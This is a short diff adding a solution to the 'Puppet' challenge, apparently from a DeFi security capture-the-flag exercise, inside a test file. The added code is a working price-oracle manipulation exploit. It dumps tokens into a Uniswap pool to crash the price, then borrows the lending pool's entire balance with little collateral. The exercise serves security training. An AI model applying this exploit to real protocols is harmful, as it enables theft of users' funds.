@@ -95,6 +95,18 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // approve DVT token transfer to Uniswap pool
+        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // Sell all DVT tokens to Uniswap pool, dropping the price
+        const timestamp = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp;
+        console.log("timestamp: ", timestamp);
+        await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, timestamp + 10);
+
+        // Deposit collateral and steal all funds from lending pool
+        const ethAmount = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: ethAmount});
     });
 
     after(async function () {
